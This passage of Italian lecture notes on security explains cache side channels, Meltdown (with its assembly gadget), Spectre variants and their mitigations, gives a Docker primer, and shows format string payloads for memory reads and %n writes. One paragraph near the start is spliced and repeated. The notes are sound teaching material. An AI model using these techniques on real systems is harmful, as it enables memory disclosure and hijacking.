    \item \textbf{Attacco a template} (\textit{Template Attack}): recupera chiavi crittografiche sfruttando un dispositivo ``modello'' identico e confrontando i dati dei canali laterali raccolti.
\end{itemize}

Nel contesto di Meltdown e Spectre, gli attacchi side channel sono resi possibili dalla \textbf{microarchitettura della CPU} e si basano sulle informazioni ottenute dall'implementazione fisica del sistema:

\begin{itemize}
    \item \textbf{Cache}: monitora la velocità con cui vengono effettuati gli accessi ai dati in cache.
    \item \textbf{Timing}: monitora il tempo impiegato dalla macchina per eseguire vari calcoli.
    \item \textbf{Power monitoring}: monitora il consumo energetico di varie computazioni.
\end{itemize}

\subsection*{Sfruttare la Cache: Flush+Reload e Evict+Reload}

Le due tecniche principali per sfruttare la cache come side channel sono:

\subsubsection*{Flush+Reload}

Il principio si basa sulla differenza di tempo tra un accesso in cache 
(\textit{cache hit}) e un accesso in RAM (\textit{cache miss}). L'attaccante predispone un array accessibile anche dalla vittima (es. tramite memoria condivisa). La vittima, durante la sua esecuzione, usa il valore segreto come indice e carica quella specifica riga di cache.

\begin{enumerate}
    \item \textbf{Flush}: l'attaccante svuota l'intero array
    dalla cache tramite l'istruzione \texttt{clflush}. In questo modo nessun elemento dell'array è presente in cache.
    
    \item \textbf{Esecuzione}: la vittima esegue il proprio codice e accede, caricando in cache la riga corrispondente al valore segreto (il valore segreto è usato come indice).
    
    \item \textbf{Reload}: l'attaccante riaccede a ogni elemento dell'array e misura il tempo di accesso. L'unico elemento con un tempo di accesso rapido (cache hit) è quello caricato dalla vittima: il suo indice rivela il valore segreto.
\end{enumerate}

\subsubsection*{Evict+Reload}

Funziona con lo stesso principio di Flush+Reload, ma non utilizza 
l'istruzione \texttt{clflush}. L'espulsione dalla cache avviene 
\textbf{indirettamente}, sfruttando la dimensione limitata della cache.

\begin{itemize}
    \item \textbf{Evict}: l'attaccante carica in memoria una grande quantità di dati casuali. A causa delle dimensioni limitate della cache, i nuovi dati \textit{espellono} (\textit{evict}) le righe di cache dell'array, che torna in RAM.
    
    \item \textbf{Esecuzione}: la vittima esegue e accede, ricaricando in cache la riga corrispondente al segreto.
    
    \item \textbf{Reload}: l'attaccante riaccede a ogni elemento e misura i tempi. Come in Flush+Reload, l'elemento con accesso rapido rivela il valore segreto.
\end{itemize}

\noindent La differenza fondamentale tra le due tecniche è che 
\textbf{Evict+Reload} non richiede l'istruzione privilegiata 
\texttt{clflush}, rendendola applicabile in contesti più restrittivi 
(es. linguaggi sandboxed come JavaScript).re quali indirizzi erano stati caricati in cache dalla vittima.

La differenza principale rispetto a Flush+Reload è che Evict+Reload \textbf{non richiede l'istruzione privilegiata \texttt{clflush}}: l'espulsione dalla cache avviene indirettamente caricando altri dati.

\subsection*{Controllo dei Privilegi e Vulnerabilità}

Le moderne CPU impongono un \textbf{controllo dei privilegi} ogni volta che un programma tenta di accedere alla memoria del kernel. Tuttavia, a causa dell'esecuzione speculativa, questo controllo può avvenire \textbf{troppo tardi}:

\begin{itemize}
    \item Il controllo dei privilegi non viene eseguito finché l'istruzione non viene \textbf{completata}: nel frattempo, i dati potrebbero essere già stati letti dalla memoria kernel e caricati in cache.
    \item Le CPU sono consapevoli di questo comportamento: qualsiasi operazione eseguita senza i privilegi necessari viene \textbf{annullata} e viene sollevata un'eccezione (tipicamente \texttt{SIGSEGV}).
    \item Tuttavia, anche dopo l'annullamento, la memoria a cui si è avuto accesso durante l'esecuzione speculativa \textbf{rimane archiviata nella cache}.
\end{itemize}

\noindent Questo è il punto critico sfruttato da Meltdown: sebbene il risultato dell'istruzione non autorizzata venga scartato, il suo \textbf{effetto collaterale sulla cache} persiste ed è misurabile tramite una tecnica Flush+Reload, permettendo all'attaccante di dedurre il contenuto della memoria kernel.

\section*{Meltdown}

\subsection*{Toy Example: esecuzione fuori ordine e cache}

Il principio alla base di Meltdown si basa su un'osservazione fondamentale:
\textbf{anche se una locazione di memoria viene acceduta solo durante 
l'esecuzione fuori ordine, il suo contenuto rimane in cache}. Iterando 
sulle 256 pagine del \texttt{probe\_array} si osserva esattamente un 
cache hit, sulla pagina che è stata acceduta durante l'esecuzione 
fuori ordine.

\begin{lstlisting}[language=C]
raise_exception();
// the line below is never reached
access(probe_array[data * 4096]);
\end{lstlisting}

Sebbene la riga 3 non venga mai raggiunta in ordine di esecuzione normale 
(perché \texttt{raise\_exception()} la precede), la CPU la esegue 
speculativamente in anticipo. Quando il controllo dei privilegi fallisce 
e viene sollevata l'eccezione, il risultato viene annullato ma 
\textbf{la riga di cache caricata persiste}.

\subsection*{Il codice assembly di Meltdown}

\begin{lstlisting}[language={[x86masm]Assembler}]
; rcx = kernel address, rbx = probe array
xor rax, rax       ; riga 2
retry:             ; riga 3
mov al, byte [rcx] ; riga 4
shl rax, 0xc       ; riga 5
jz retry           ; riga 6
mov rbx, qword [rbx + rax] ; riga 7
\end{lstlisting}

\subsection*{Analisi riga per riga}

\paragraph{Passo 1 Allocazione del probe array (prerequisito)}
Prima dell'esecuzione del codice assembly, l'attaccante alloca un blocco 
di memoria composto da \textbf{256 pagine} ($256 \times 4096$ byte), 
referenziato dal registro \texttt{RBX}. Nessuna pagina è inizialmente 
in cache, poiché non è mai stata acceduta.

\paragraph{Riga 2 \texttt{xor rax, rax}}
Azzera il registro \texttt{RAX} eseguendo uno XOR con se stesso 
(qualunque valore XOR se stesso = 0). Serve per partire da uno 
stato pulito prima di leggere il byte segreto.

\paragraph{Riga 4 \texttt{mov al, byte [rcx]}}
Carica il byte situato all'indirizzo kernel contenuto in \texttt{RCX} 
nel registro \texttt{AL} (byte meno significativo di \texttt{RAX}). 
Questo è il \textbf{punto critico}: si tratta di un accesso non 
autorizzato alla memoria kernel. Il controllo dei privilegi viene 
avviato, ma \textbf{la CPU esegue le istruzioni successive 
speculativamente} prima che il controllo termini.

\paragraph{Riga 5 \texttt{shl rax, 0xc}}
Esegue uno shift a sinistra di \texttt{0xc} = 12 bit sul contenuto 
di \texttt{RAX}:
\[
    \texttt{RAX} \leftarrow \texttt{RAX} \times 2^{12} 
    = \texttt{RAX} \times 4096
\]
Questo converte il valore del byte segreto (0--255) nell'offset 
corrispondente nel probe array, garantendo che ogni possibile valore 
cada su una \textbf{pagina separata} (evitando interferenze tra 
cache line adiacenti, come discusso in precedenza).

\paragraph{Riga 6 --- \texttt{jz retry}}
Se \texttt{RAX} è ancora zero (il byte letto era 0 oppure la lettura 
non ha ancora prodotto un valore utile), si torna all'etichetta 
\texttt{retry} e si riprova. Il ciclo continua finché \texttt{AL} 
non contiene un valore diverso da zero.

\paragraph{Riga 7 --- \texttt{mov rbx, qword [rbx + rax]}}
Accede al probe array all'indice \texttt{RAX} (cioè 
\texttt{probe\_array[secret * 4096]}), caricando in cache la pagina 
corrispondente al valore del byte segreto. Questa istruzione viene 
eseguita \textbf{fuori ordine}, prima che il controllo dei privilegi 
della riga 4 sia completato.

\subsection*{La race condition e l'effetto sulla cache}

L'attacco sfrutta una race condition tra:
\begin{itemize}
    \item il \textbf{controllo dei privilegi} avviato dalla riga 4 
    (lettura dalla memoria kernel);
    \item l'\textbf{esecuzione speculativa} delle righe 5 e 7.
\end{itemize}

Se il controllo dei privilegi termina \textit{dopo} che la riga 7 
è già stata eseguita speculativamente:
\begin{enumerate}
    \item Il controllo fallisce → viene sollevata un'eccezione 
    (\texttt{SIGSEGV}) e i risultati speculativi vengono annullati.
    \item Tuttavia, \textbf{la pagina del probe array corrispondente 
    al byte segreto rimane in cache}.
\end{enumerate}

Ad esempio: se il byte all'indirizzo kernel è \texttt{21}, la CPU 
ha eseguito speculativamente \texttt{probe\_array[21 * 4096]}, 
caricando la \textbf{21\textsuperscript{a} pagina} in cache.

\subsection*{Recupero del valore segreto}

L'attaccante recupera il segreto nel seguente modo:
\begin{enumerate}
    \item \textbf{Intercetta l'eccezione} generata dal controllo dei 
    privilegi (tramite un signal handler o meccanismo simile).
    \item \textbf{Itera su tutte le 256 pagine} del probe array.
    \item \textbf{Misura il tempo di accesso} a ciascuna pagina 
    (tecnica Flush+Reload).
    \item La pagina con tempo di accesso \textbf{notevolmente più 
    basso} (cache hit) è quella caricata durante l'esecuzione 
    speculativa: il suo indice corrisponde al valore del byte segreto.
\end{enumerate}

Nell'esempio: le pagine 0--20 risultano lente da leggere (cache miss, 
$\sim$100ns), mentre la pagina 21 risulta molto più veloce (cache hit, 
$\sim$5ns) $\Rightarrow$ il valore segreto è \textbf{21}.


\section*{Spectre Attack}

\subsection*{Variant 1 Conditional Branch Misprediction}

\subsubsection*{Il codice vulnerabile}

\begin{lstlisting}[language=C]
if (x < array1_size)
    y = array2[array1[x] * 4096];
\end{lstlisting}

Questo codice appare perfettamente corretto: accede ad \texttt{array1[x]} 
solo se \texttt{x} è entro i limiti dell'array. Tuttavia, è vulnerabile 
a Spectre tramite il meccanismo di \textbf{branch prediction}.

\subsubsection*{Come funziona il Branch Predictor}

Le moderne CPU non aspettano di valutare la condizione di un \texttt{if} 
prima di eseguire il corpo: lo \textbf{predicono} basandosi sulla storia 
degli esecuzioni precedenti. Se il ramo condizionale è stato vero molte 
volte di fila, la CPU assume che sarà vero anche la prossima volta ed 
esegue speculativamente il corpo \textit{prima ancora di verificare la 
condizione}.

\subsubsection*{Struttura dell'attacco}

Sia \texttt{secret} l'indirizzo di un byte segreto (es. una password) 
in memoria. L'attaccante definisce:
\[
    x = \texttt{secret} - \texttt{array1\_base}
\]
In questo modo, \texttt{array1[x]} punta esattamente al valore segreto.
Ovviamente, \texttt{x} è fuori dai limiti di \texttt{array1}, quindi 
l'accesso non dovrebbe essere permesso.

L'attacco si svolge in tre fasi:

\begin{enumerate}
    \item \textbf{Addestramento del branch predictor}: l'attaccante 
    esegue il ciclo molte volte con valori di \texttt{x} \textit{validi} 
    (cioè $x < \texttt{array1\_size}$). Il branch predictor impara che 
    la condizione è quasi sempre vera e inizia a predire 
    \texttt{true} automaticamente.

    \item \textbf{Esecuzione speculativa con valore malevolo}: 
    l'attaccante passa il valore \texttt{x = secret - array1\_base}. 
    Il branch predictor, ingannato dall'addestramento, predice che la 
    condizione sarà vera ed esegue speculativamente il corpo del ciclo:
    \begin{itemize}
        \item Legge \texttt{array1[x]}, ottenendo il valore segreto.
        \item Usa il segreto come indice: 
        \texttt{array2[secret\_value * 4096]}, caricando in cache 
        la pagina corrispondente.
    \end{itemize}
    Quando la CPU verifica che $x \geq \texttt{array1\_size}$, 
    annulla i risultati speculativi --- ma \textbf{la pagina di 
    \texttt{array2} rimane in cache}.

    \item \textbf{Recupero del segreto via side channel}: l'attaccante 
    itera su tutte le 256 pagine di \texttt{array2} e misura il tempo 
    di accesso (Flush+Reload). La pagina con accesso più rapido 
    (cache hit) rivela il valore del byte segreto.
\end{enumerate}

\noindent\textbf{Differenza chiave rispetto a Meltdown:} Spectre non 
accede direttamente alla memoria kernel; inganna un programma 
\textit{legittimo} a fare l'accesso al posto suo, sfruttando 
l'esecuzione speculativa del suo stesso codice.

\subsection*{Variant 2 Branch Target Injection (Poisoning Indirect Branches)}

\subsubsection*{Indirect Branch}

Un \textbf{indirect branch} è un salto a un indirizzo di memoria 
contenuto in un registro o in memoria, anziché a un indirizzo fisso 
nel codice. Ad esempio:

\begin{lstlisting}[language={[x86masm]Assembler}]
jmp [eax]   ; salta all'indirizzo contenuto in EAX
\end{lstlisting}

Questi salti sono tipici delle chiamate a puntatori a funzione 
(\textit{function pointers}), delle vtable in C++, e dei dispatch 
dinamici in generale.

\subsubsection*{Branch Target Buffer (BTB)}

Il \textbf{Branch Target Buffer (BTB)} è una struttura hardware 
della CPU che mantiene una mappatura:
\[
    \texttt{indirizzo istruzione di salto} 
    \;\longrightarrow\; 
    \texttt{indirizzo di destinazione previsto}
\]
La CPU usa il BTB per prevedere la destinazione di un salto indiretto 
\textit{prima ancora di decodificare l'istruzione}, consentendo 
l'esecuzione speculativa del codice a quella destinazione.

Il problema è che il BTB è \textbf{condiviso tra processi}: un 
processo attaccante può \textit{addestrare} il BTB per far sì che 
la CPU predica erroneamente la destinazione di un salto indiretto 
nel processo vittima.

\subsubsection*{Struttura dell'attacco}

\begin{enumerate}
    \item \textbf{Identificazione di uno Spectre gadget}: l'attaccante 
    individua nel codice della vittima (o del kernel) un frammento di 
    codice --- detto \textbf{Spectre gadget} --- la cui esecuzione 
    speculativa trasferisce informazioni sensibili in un canale nascosto 
    (es. accede al probe array con un valore segreto come indice).

    \item \textbf{Poisoning del BTB}: l'attaccante esegue nel 
    proprio processo un salto indiretto ripetutamente verso 
    l'indirizzo virtuale del gadget. Il BTB viene così addestrato 
    (\textit{poisoned}) ad associare l'istruzione di salto indiretto 
    della vittima alla destinazione del gadget.

    \item \textbf{Esecuzione speculativa del gadget}: quando il 
    processo vittima esegue il proprio salto indiretto, la CPU 
    consulta il BTB (corrotto) e speculativamente esegue il gadget, 
    caricando in cache il valore segreto.

    \item \textbf{Recupero via side channel}: come in Variant 1, 
    l'attaccante usa Flush+Reload per dedurre il valore segreto 
    dalla cache.
\end{enumerate}

\noindent\textbf{Caratteristica distintiva di Variant 2:} non dipende 
da vulnerabilità nel codice della vittima. Qualsiasi programma con 
un salto indiretto può essere bersaglio, indipendentemente da quanto 
sia scritto correttamente.

\subsection*{Confronto tra Meltdown e Spectre}

\begin{center}
\begin{tabular}{|l|c|c|}
\hline
\textbf{Caratteristica} & \textbf{Meltdown} & \textbf{Spectre} \\
\hline
Meccanismo & Out-of-order execution & Branch misprediction \\
Bersaglio & Memoria kernel & Memoria di altri processi \\
Richiede codice vulnerabile & No & Variant 1: sì / Variant 2: no \\
Difficoltà di sfruttamento & Più semplice & Più complesso \\
Difficoltà di mitigazione & Più semplice & Più difficile \\
\hline
\end{tabular}
\end{center}

\subsection*{Mitigazioni}

La soluzione ideale a queste vulnerabilità è \textbf{hardware}: 
riprogettare la CPU per eliminare alla radice il problema. Tuttavia, 
questo richiede tempi lunghi, costi elevati e non è applicabile 
ai miliardi di dispositivi già in uso.

Sono state quindi sviluppate \textbf{patch software} come soluzione 
temporanea:

\begin{itemize}
    \item \textbf{KPTI} (\textit{Kernel Page-Table Isolation}), 
    precedentemente nota come \textbf{KAISER}, adottata su Linux:
    \begin{itemize}
        \item Separa completamente le tabelle delle pagine del kernel 
        da quelle dello spazio utente.
        \item Quando un processo utente è in esecuzione, la memoria 
        kernel è quasi completamente \textbf{rimossa} dal suo spazio 
        di indirizzamento virtuale, eliminando il canale laterale 
        sfruttato da Meltdown.
        \item \textbf{Svantaggio}: introduce una penalizzazione delle 
        prestazioni, poiché ogni transizione user/kernel richiede 
        un cambio di tabella delle pagine (TLB flush).
    \end{itemize}

    \item \textbf{Retpoline} (per Spectre Variant 2): tecnica 
    compilativa che sostituisce i salti indiretti con costrutti 
    che non vengono predetti dal BTB, neutralizzando il 
    branch target injection.

    \item \textbf{Serializzazione dei rami} (per Spectre Variant 1): 
    inserimento di istruzioni di barriera (\texttt{lfence}) dopo i 
    controlli sui limiti degli array, per impedire l'esecuzione 
    speculativa del corpo del ramo prima che la condizione sia 
    verificata.
\end{itemize}


\section{Docker}

\subsection*{Esecuzione tradizionale, virtualizzata e in contenitori}

Esistono tre modalità principali per eseguire applicazioni:

\begin{itemize}
    \item \textbf{Esecuzione tradizionale (fisica):} le applicazioni girano direttamente sul sistema operativo dell'host, condividendo le stesse risorse. Non esiste alcun meccanismo per limitare le risorse per singola applicazione, e isolare le applicazioni richiede server fisici separati, il che è costoso e spesso comporta un sottoutilizzo delle risorse.

    \item \textbf{Esecuzione virtualizzata (VM):} tramite un software chiamato \textit{Hypervisor} (es. VirtualBox, Linux KVM), vengono create delle \textit{Macchine Virtuali (VM)} che emulano hardware fisico. Ogni VM esegue un proprio sistema operativo completo con le relative applicazioni, condividendo le risorse fisiche dell'host. Questo approccio:
    \begin{itemize}
        \item consente di isolare completamente le applicazioni tra di loro;
        \item migliora l'utilizzo delle risorse fisiche;
        \item aumenta la scalabilità.
    \end{itemize}
    È \textbf{pesante}: ogni VM richiede una copia intera del sistema operativo, il che comporta un overhead significativo. È ideale quando le applicazioni devono girare su versioni diverse del sistema operativo.

    \item \textbf{Esecuzione in contenitori:} i \textit{contenitori} sono ambienti isolati che condividono lo stesso kernel del sistema operativo host. Non viene virtualizzato l'hardware, ma il sistema operativo stesso. Ogni contenitore viene eseguito a partire da una propria \textit{immagine} che include tutti i file necessari (binari, librerie, dipendenze). Questo approccio è:
    \begin{itemize}
        \item \textbf{leggero}: la condivisione del kernel riduce drasticamente l'overhead rispetto alle VM;
        \item fornisce un isolamento a livello di processo (meno rigido rispetto alle VM);
        \item ideale per applicazioni che devono girare sullo stesso kernel.
    \end{itemize}
    Un esempio di tecnologia di containerizzazione è \textbf{Docker}.
\end{itemize}

\subsection*{Immagini e contenitori Docker}

In Docker è fondamentale distinguere tra \textit{immagine} e \textit{contenitore}:

\begin{itemize}
    \item \textbf{Immagine:} è un pacchetto \textit{immutabile} (in sola lettura) che include tutto il necessario per eseguire un'applicazione: codice sorgente o compilato, runtime, librerie di sistema, strumenti e configurazioni. Le immagini sono il \textit{template} da cui vengono creati i contenitori.

    \item \textbf{Contenitore:} è un'\textit{istanza in esecuzione} di un'immagine. Quando si avvia un contenitore, Docker aggiunge un \textit{livello scrivibile} sopra l'immagine di base: tutte le modifiche (scrittura di file, modifiche alla configurazione, ecc.) vengono salvate su questo livello e non alterano l'immagine sottostante.
\end{itemize}

A questi si aggiunge il concetto di \textbf{Registry}: un repository centralizzato per ospitare e distribuire immagini Docker. Può essere pubblico (es. \textit{Docker Hub}) o privato.

\subsection*{Ciclo di vita di un contenitore Docker}

Le immagini Docker possono essere ottenute in due modi:
\begin{itemize}
    \item \textbf{Scaricandole} da un registry centrale come Docker Hub (\texttt{docker pull});
    \item \textbf{Costruendole} localmente a partire da un \texttt{Dockerfile} (\texttt{docker build}).
\end{itemize}

Una volta disponibile un'immagine nel repository locale, il ciclo di vita di un contenitore segue questi stati:

\begin{enumerate}
    \item \textbf{Created}: il contenitore è stato creato a partire dall'immagine (aggiunta del livello scrivibile), ma non è ancora in esecuzione.
    \item \textbf{Running}: il contenitore è in esecuzione. All'avvio viene eseguito automaticamente il comando definito nell'\textit{entrypoint} dell'immagine (può essere sovrascritto). Un contenitore rimane in esecuzione fintanto che il processo in primo piano dell'entrypoint è attivo.
    \item \textbf{Paused}: il contenitore è temporaneamente sospeso.
    \item \textbf{Stopped}: il contenitore è stato fermato.
    \item \textbf{Deleted}: il contenitore è stato rimosso.
\end{enumerate}

Le immagini personalizzate possono essere caricate (\texttt{push}) sul registry centrale per essere condivise o riutilizzate in altri ambienti (staging, produzione).

\subsection*{Dockerfile}

Un \texttt{Dockerfile} è un file di testo che contiene le istruzioni per costruire automaticamente un'immagine Docker personalizzata. Il comando \texttt{docker build} legge il \texttt{Dockerfile} e produce l'immagine corrispondente.

Le istruzioni principali sono:

\begin{center}
\begin{tabular}{|l|l|l|}
\hline
\textbf{Istruzione} & \textbf{Descrizione} & \textbf{Esempio} \\
\hline
\texttt{FROM <immagine>} & Imposta l'immagine di base & \texttt{FROM ubuntu} \\
\texttt{RUN <cmd>} & Esegue un comando durante la build & \texttt{RUN apt install apache2} \\
\texttt{COPY <src> <dest>} & Copia un file nel filesystem dell'immagine & \texttt{COPY vh.conf /etc/apache2/conf/} \\
\texttt{CMD ["exec", ...]} & Definisce il comando eseguito all'avvio & \texttt{CMD ["apache2", "-D", "FOREGROUND"]} \\
\hline
\end{tabular}
\end{center}

\subsection*{Comandi principali Docker}

\subsubsection*{Gestione delle immagini}
\begin{itemize}
    \item \texttt{docker pull <immagine>} --- scarica un'immagine da Docker Hub
    \item \texttt{docker build -t <nome> .} --- costruisce un'immagine dal \texttt{Dockerfile} nella directory corrente
    \item \texttt{docker images} --- elenca le immagini presenti nel repository locale
    \item \texttt{docker rmi <immagine>} --- rimuove un'immagine
\end{itemize}

\subsubsection*{Gestione dei contenitori}
\begin{itemize}
    \item \texttt{docker run <immagine>} --- crea e avvia un contenitore
    \item \texttt{docker run --entrypoint <cmd> <immagine>} --- avvia un contenitore sovrascrivendo l'entrypoint predefinito
    \item \texttt{docker exec -it <containerID> <cmd>} --- esegue un comando (es. \texttt{/bin/bash}) all'interno di un contenitore già in esecuzione
    \item \texttt{docker stop <containerID>} --- ferma un contenitore
    \item \texttt{docker rm <containerID>} --- rimuove un contenitore
    \item \texttt{docker ps -a} --- elenca tutti i contenitori (in esecuzione e fermati)
\end{itemize}

\subsection*{Docker Compose}

\textbf{Docker Compose} è uno strumento che permette di definire ed eseguire applicazioni composte da \textit{più contenitori} tramite un unico file di configurazione: \texttt{docker-compose.yaml}.

Il file utilizza la sintassi \textbf{YAML} e definisce:
\begin{itemize}
    \item \textbf{Servizi}: la configurazione applicata a ciascun contenitore (equivalente ai parametri passati a \texttt{docker run});
    \item \textbf{Reti} (opzionale): configurazione delle reti virtuali tra i contenitori;
    \item \textbf{Volumi} (opzionale): configurazione dei volumi per la persistenza dei dati.
\end{itemize}

\subsubsection*{Comandi principali di Docker Compose}
\begin{itemize}
    \item \texttt{docker-compose up -d} --- (ri)costruisce le immagini se necessario e avvia tutti i servizi in background
    \item \texttt{docker-compose stop} --- ferma i servizi senza rimuoverli
    \item \texttt{docker-compose start -d} --- riavvia i servizi fermati
    \item \texttt{docker-compose down} --- ferma e rimuove i contenitori e le reti create da Compose
    \item \texttt{docker-compose logs -f [nome\_servizio]} --- mostra i log in tempo reale (output dell'entrypoint)
\end{itemize}


\section{Format String}

\subsection*{Introduzione}

Le \textit{format string} sono le stringhe di controllo passate alle funzioni della famiglia \texttt{printf()}, che contengono il template di output per quelle funzioni. Queste funzioni sono vulnerabili ogni volta che un attaccante riesce a controllare la format string stessa.

Queste vulnerabilità possono essere estremamente potenti nelle mani di un attaccante esperto. Nel caso peggiore, l'attaccante è in grado di eseguire \textbf{letture arbitrarie dalla memoria} e persino \textbf{scritture arbitrarie in memoria}: ovvero, può leggere parole da indirizzi di memoria scelti da lui stesso, oppure sovrascrivere locazioni di memoria a sua scelta con valori a sua scelta.

È evidente come questi poteri permettano a un attaccante di aggirare completamente le protezioni come i \textit{stack canary}, ad esempio leggendo il canary dalla memoria, sovrascrivendo il canary globale, oppure sovrascrivendo un indirizzo di ritorno senza toccare il canary.

\subsection*{Il bug della format string}

Il vettore di attacco deriva dal modo in cui le \textit{funzioni variadiche} sono implementate in C. Le funzioni variadiche sono dichiarate terminando la lista dei loro argomenti con \texttt{"..."}. Ad esempio, \texttt{printf()} può essere dichiarata come:

\begin{verbatim}
int printf(const char *fmt, ...);
\end{verbatim}

Il compilatore C gestisce queste funzioni semplicemente non controllando il numero e i tipi degli argomenti passati nella posizione \texttt{"..."}. Tutti gli argomenti presenti nel sito di chiamata vengono collocati nei registri o sullo stack. Se la funzione chiamata necessita di uno di questi argomenti, legge la posizione attesa per quell'argomento — senza alcun modo di sapere se l'argomento sia stato effettivamente passato o se il tipo sia corretto: leggerà semplicemente qualunque cosa si trovi in quella posizione e la interpreterà come un valore del tipo atteso.

Nella famiglia \texttt{printf()}, la convenzione è che ogni specificatore di formato consuma un argomento aggiuntivo. Ad esempio:

\begin{verbatim}
printf("a is %d and b is %d\n", a, b);
\end{verbatim}

Il primo \texttt{\%d} leggerà il primo argomento (\texttt{a}) dopo la format string e stamperà il suo valore intero; il secondo \texttt{\%d} leggerà l'argomento successivo (\texttt{b}). Su sistemi a 32 bit il primo argomento si trova sullo stack appena sotto il puntatore alla format string; su sistemi a 64 bit i primi 6 argomenti (incluso il puntatore alla format string) sono nei registri, e gli eventuali argomenti aggiuntivi vengono pushati sullo stack.

Consideriamo ora una chiamata come questa:

\begin{verbatim}
printf("a is %d and b is %d\n", a);
\end{verbatim}

dove ci sono due \texttt{\%d} ma un solo argomento aggiuntivo. Questo codice \textbf{compila senza errori}. A runtime, \texttt{printf()} stamperà correttamente il valore di \texttt{a}, ma poi stamperà anche qualunque cosa si trovi sotto \texttt{a} sullo stack (32 bit), oppure il contenuto corrente del registro \texttt{rdx} (64 bit).

Infine, consideriamo:

\begin{verbatim}
printf(buf);
\end{verbatim}

dove il contenuto di \texttt{buf} è controllato dall'attaccante. Il programmatore voleva semplicemente stampare una stringa, ma \texttt{printf()} interpreta ogni carattere \texttt{\%} dentro \texttt{buf} come uno specificatore di formato. Ciascuno di questi specificatori richiede un argomento corrispondente, e \texttt{printf()} leggerà i registri o le locazioni di memoria dove quell'argomento avrebbe dovuto trovarsi — il tutto sotto il controllo dell'attaccante. Il modo corretto per stampare una stringa è \texttt{puts(buf)} oppure \texttt{printf("\%s", buf)}.

\subsection*{Sfruttare le vulnerabilità di format string}

È utile pensare a \texttt{printf()} come a una \textit{macchina virtuale} con il proprio linguaggio di programmazione. La format string è il \textit{programma}, e le istruzioni sono i caratteri normali e gli specificatori di formato. La macchina \texttt{printf()} ha il proprio \textit{instruction pointer} che punta al prossimo carattere da ``eseguire'' e si muove solo in avanti, senza salti né cicli.

Lo stato della macchina comprende:
\begin{enumerate}
    \item un \textbf{argument pointer}, che punta all'argomento da usare per il prossimo specificatore di formato;
    \item un \textbf{output counter}, che conta il numero di caratteri già scritti in output.
\end{enumerate}

Ad esempio, \texttt{\%d} legge l'argomento puntato dall'argument pointer, sposta quest'ultimo all'argomento successivo, interpreta l'argomento come intero, lo stampa e incrementa l'output counter. Sorprendentemente, la macchina \texttt{printf()} può anche \textbf{scrivere in memoria} tramite lo specificatore \texttt{\%n} (poco noto): l'argomento di \texttt{\%n} deve essere un puntatore a un intero, e \texttt{printf()} vi scriverà il valore corrente dell'output counter. Per esempio:

\begin{verbatim}
printf("AAAAA%nBBB%nCCCC", &cnt1, &cnt2);
\end{verbatim}

assegnerà \texttt{5} a \texttt{cnt1} e \texttt{8} a \texttt{cnt2}.

\subsubsection*{Lettura dallo stack}

Il modo più semplice di sfruttare una format string vulnerability è far trapelare informazioni dallo stack del processo vittima. Su sistemi a 32 bit, una sequenza di specificatori \texttt{\%x} causerà la stampa di valori consecutivi dallo stack. Su sistemi a 64 bit, i primi 5 \texttt{\%lx} stamperanno il contenuto dei registri \texttt{rsi}, \texttt{rdx}, \texttt{rcx}, \texttt{r8} e \texttt{r9}; i successivi inizieranno a stampare dati dallo stack. Studiando il binario, o semplicemente osservando l'output, l'attaccante può individuare quale di questi valori corrisponde allo stack canary. Si noti che su sistemi a 64 bit è necessario usare \texttt{\%lx} (non \texttt{\%x}), poiché \texttt{\%x} legge solo 4 byte in entrambi i sistemi.

La principale difficoltà per l'attaccante è la limitazione di spazio nel buffer: l'argument pointer avanza di almeno una \textit{stack line} per ogni specificatore, e con un buffer di dimensione $s$ si possono scorrere al massimo $\lfloor s/2 \rfloor$ righe dello stack, il che potrebbe non essere sufficiente a raggiungere la posizione del canary.

\subsubsection*{Accesso casuale agli argomenti}

La format string supporta anche l'accesso diretto agli argomenti tramite la sintassi \texttt{\%n\$}, che seleziona l'$n$-esimo argomento direttamente. Per esempio:

\begin{verbatim}
printf("%4$d %1$d %3$d %2$d\n", 10, 20, 30, 40);
\end{verbatim}

stamperà \texttt{40 10 30 20}.

In alcuni casi questa sintassi permette di superare le limitazioni di spazio: se si sa che il canary si trova $n$ stack-lines sotto il puntatore alla format string, \texttt{\%n\$x} (32 bit) o \texttt{\%(n+5)\$lx} (64 bit) lo stamperanno direttamente.

Tuttavia, secondo lo standard, l'accesso casuale e quello sequenziale agli argomenti sono \textbf{mutualmente esclusivi}, e non ci possono essere ``gap'' nella lista degli argomenti referenziati. Questo perché, per saltare all'$n$-esimo argomento, \texttt{printf()} deve conoscere quante stack lines occupano tutti gli argomenti precedenti (il che dipende dal tipo di ciascuno). Se la regola del no-gap è rispettata, l'accesso casuale non può essere usato per superare le limitazioni di spazio nel buffer.

\subsubsection*{Lettura arbitraria dalla memoria}

La limitazione precedente può essere superata se l'attaccante controlla sia la format string che almeno parte dei suoi argomenti, ad esempio quando la format string è essa stessa sullo stack e può essere raggiunta dall'argument pointer.

Sia $o$ il numero di stack-lines tra il primo argomento di \texttt{printf()} (incluso) e la prima line della copia della format string (esclusa). Allora:
\begin{itemize}
    \item su sistemi a 32 bit, gli argomenti da 1 a $o$ leggono le stack-lines intermedie, mentre l'argomento $o+1$ legge la prima line della format string;
    \item su sistemi a 64 bit, gli argomenti 1--5 leggono i registri, gli argomenti da 6 a $o+5$ leggono le stack-lines, e l'argomento $o+6$ legge la prima line della format string.
\end{itemize}

L'istruzione chiave è \texttt{\%s}: normalmente stampa una stringa, ma nella nostra ``macchina printf'' si comporta come un'istruzione di \textbf{lettura arbitraria dalla memoria}: stampa il contenuto della memoria a partire dall'indirizzo specificato come argomento, fino al primo byte nullo.

Ad esempio, con $o = 2$ su un sistema a 32 bit, per leggere dalla locazione \texttt{0x11223344} si può preparare la stringa:
\begin{verbatim}
"\x44\x33\x22\x11%c%c%s"
\end{verbatim}
I due \texttt{\%c} servono a spostare l'argument pointer fino all'inizio della format string stessa, in modo che \texttt{\%s} usi \texttt{0x11223344} come indirizzo. Per evitare che \texttt{printf()} continui a leggere fino a indirizzi non accessibili, si può usare \texttt{\%.ms} che legge al massimo $m$ byte.

I byte nulli nell'indirizzo possono essere problematici (il byte nullo termina la format string), ma possono essere aggirati posizionando l'indirizzo \textit{dopo} gli specificatori. Con accesso casuale disponibile, basta usare \texttt{\%3\$s\textbackslash x11\textbackslash x22\textbackslash x00\textbackslash x44}.

\subsubsection*{Scrittura arbitraria in memoria}

Il potere massimo è la capacità di sovrascrivere parole arbitrarie di memoria con valori arbitrari, combinando \texttt{\%n} con il controllo preciso dell'output counter.

L'output counter si controlla facilmente: \texttt{\%mc} incrementa sempre il counter esattamente di $m$. Per scrivere valori grandi (come indirizzi di funzione) senza generare un numero impraticabile di byte in output, si usano:
